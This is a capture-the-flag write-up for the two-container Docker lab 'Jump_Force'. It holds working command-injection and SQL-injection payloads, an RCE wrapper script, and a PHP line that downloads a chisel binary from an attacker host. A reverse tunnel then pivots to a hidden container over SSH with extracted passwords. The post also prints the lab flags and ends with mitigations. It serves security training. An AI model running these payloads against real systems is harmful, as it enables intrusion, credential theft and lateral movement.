---
layout: post
title: "Jump_Force — TFM CTF"
description: "Command injection, SQL injection, acceso a MariaDB y pivoting entre contenedores con túnel inverso chisel."
categories: [machines]
tags: [tfm, ctf, command-injection, sqli, mariadb, pivoting, chisel, docker]
---

> This is the most complex machine in the lab. Two containers on an internal Docker network — `jump_force_one` exposes services to the attacker, `jump_force_two` is completely hidden. Getting the second flag requires pivoting through the first container using a reverse tunnel.

## Recon

```bash
sudo docker-compose up -d && sudo docker ps
nmap -p- --open -sT -T3 -v -n TARGET_IP
nmap -sT -sV -sC -p 5000 -n -Pn TARGET_IP
```

One exposed port: **5000 — HTTP (Apache 2.4.25 Debian, December 2016).** Very old, multiple known CVEs, no direct pre-auth exploit in this scenario.

---

## Enumeration

Root page message from the CTF author: *"soy una vulnerabilidad? soy dos vulnerabilidades? soy tres..."*

Three vulnerabilities, all findable through enumeration.

```bash
gobuster dir -u http://TARGET_IP:5000 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,old,cgi,sh -t 40
```

Four resources: `index.php`, `index.html.bak` (backup in web root — shouldn't be there), `backup.php` (fields named `command1` and `command2` — red flag), `password.php` (accepts `id` parameter).

---

## Vulnerability Analysis

### Command Injection in `backup.php`

```bash
# Baseline
curl -s -X POST -d "response=Y&command1=2&command2=3" http://TARGET_IP:5000/backup.php
# La suma es: 5

# Injection
curl -s -X POST \
  --data-urlencode "response=Y" \
  --data-urlencode "command1=2; id; echo" \
  --data-urlencode "command2=3" \
  http://TARGET_IP:5000/backup.php
```

> `--data-urlencode` is critical — it URL-encodes `;` properly. Plain `-d` would not.

RCE confirmed as `www-data`.

### SQL Injection in `password.php`

```bash
curl -s "http://TARGET_IP:5000/password.php?id=1'"   # MariaDB error
```

Determining columns:

```bash
for n in 1 2 3 4 5 6; do
  cols=$(seq -s, 1 $n)
  curl -s "http://TARGET_IP:5000/password.php?id=0' UNION SELECT $cols-- -"
done
```

`n=2` returns valid result — two columns, both printable.

---

## Exploitation — first flag

### RCE wrapper

```bash
#!/bin/bash
CMD="$1"
URL="http://TARGET_IP:5000/backup.php"
curl -s -X POST \
  --data-urlencode "response=Y" \
  --data-urlencode "command1=2; $CMD; echo" \
  --data-urlencode "command2=3" \
  "$URL"
echo
```

```bash
chmod +x rce.sh
./rce.sh "cat /var/www/html/backup.php"   # shell_exec() + no sanitisation → CWE-78
./rce.sh "cat /var/www/html/password.php" # hardcoded creds + SQLi → CWE-798, CWE-89
```

Credentials extracted: `poc:1234`.

```bash
./rce.sh "mysql -u poc -p1234 -e 'USE poc; SHOW TABLES;'"
# tables: flags, frases, users
./rce.sh "mysql -u poc -p1234 -e 'USE poc; SELECT * FROM flags;'"
```

```
Flag: 003d873449f8e8ff13b72f2061bfbaa4e5a84b82
```

> Same flag reachable via SQLi: `curl -s "http://TARGET_IP:5000/password.php?id=0' UNION SELECT flag_number,flag_value FROM flags-- -"`

---

## Pivoting to Jump_Force_Two — second flag

`jump_force_two` has no exposed ports. Only reachable from inside `jump_force_one`.

### Recon from inside jump_force_one

No `nmap` or `netcat` in the container. Using bash's `/dev/tcp` trick:

```bash
./rce.sh "ip a 2>/dev/null; cat /etc/hosts; arp -a 2>&1 || ip neigh"

./rce.sh "for p in 21 22 25 80 443 2222 3306 5000 8080 8443; do
  timeout 1 bash -c \"</dev/tcp/172.18.0.2/\$p\" 2>/dev/null && echo \"port \$p open\"
done"
```

Network: `jump_force_one` at `172.18.0.3`, `jump_force_two` at `172.18.0.2`. Only port open on two: **2222 (SSH)**.

### Credentials from `users` table

```bash
./rce.sh "mysql -u poc -p1234 -e 'USE poc; SELECT * FROM users;'"
```

Six username/password pairs in **plaintext** (CWE-256).

### Why chisel — understanding the reverse tunnel

The goal is to reach `jump_force_two:2222` from Kali. The problem:
- `jump_force_two` has no exposed ports — unreachable directly
- `jump_force_one` can reach `jump_force_two` via internal network
- `jump_force_one` only has RCE via web shell — no direct SSH in

Solution: **reverse port forward** — `jump_force_one` connects *outward* to Kali, which opens a local port that forwards traffic back to `jump_force_two:2222`.

### Building the tunnel

**Step 1 — Kali: download chisel and serve it:**

```bash
cd /tmp
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
gunzip chisel_1.10.1_linux_amd64.gz && mv chisel_1.10.1_linux_amd64 chisel && chmod +x chisel
python3 -m http.server 8000
```

**Step 2 — Transfer to jump_force_one (no wget/curl available, using PHP):**

```bash
./rce.sh "php -r 'file_put_contents(\"/tmp/chisel\", file_get_contents(\"http://KALI_IP:8000/chisel\"));'"
./rce.sh "chmod +x /tmp/chisel"
```

**Step 3 — Chisel server on Kali:**

```bash
/tmp/chisel server --port 9001 --reverse --host 0.0.0.0
```

**Step 4 — Chisel client from jump_force_one:**

```bash
./rce.sh 'echo "nohup /tmp/chisel client KALI_IP:9001 R:2222:172.18.0.2:2222 \
> /tmp/chisel.log 2>&1 &" > /tmp/runchisel.sh && chmod +x /tmp/runchisel.sh'
./rce.sh "/tmp/runchisel.sh & disown; sleep 2"
```

`R:2222:172.18.0.2:2222` means: *"open port 2222 on Kali and forward traffic through me to 172.18.0.2:2222"*.

> `nohup` + `disown` detaches the process from the PHP parent — without this, chisel dies when the request ends.

**Verify:**

```bash
ss -tlnp | grep 2222
nc -zv 127.0.0.1 2222
```

### SSH into jump_force_two

```bash
sshpass -p 'tefeme.!' ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -p 2222 pablo@127.0.0.1 \
  'whoami; id; cat .flag.txt'
```

> `-o UserKnownHostsFile=/dev/null` — necessary because `127.0.0.1:2222` hosted different SSH keys from other machines in this session.

```
Flag: 4d8c72671245d9d1b8e03a826db9d5ecead28c8c
```

Full chain: backup disclosure → command injection → database access → credential extraction → reverse tunnel → SSH lateral movement.

---

## Vulnerability Summary

| ID | Vulnerability | CWE | CVSS v3.1 |
|---|---|---|---|
| V1 | Backup File Disclosure (`index.html.bak`) | CWE-530 | — |
| V2 | Command Injection in `backup.php` | CWE-78 | — |
| V3 | SQL Injection in `password.php` | CWE-89 | — |
| V4 | Hardcoded credentials in `password.php` | CWE-798 | — |
| V5 | Plaintext password storage in `users` table | CWE-256 | — |
| V6 | `privileged: true` in `docker-compose.yml` | — | — |

---

## Mitigations

**V1:** Remove backup files from web root. **V2:** Replace `shell_exec()` with native PHP arithmetic; use `is_numeric()` + `escapeshellarg()` as fallback. **V3:** Use prepared statements. **V4:** Move credentials to environment variables or Docker Secrets. **V5:** Hash with `argon2id` — this single fix would have broken the entire lateral movement chain. **V6:** Remove `privileged: true`; use `cap_add`/`cap_drop` instead.
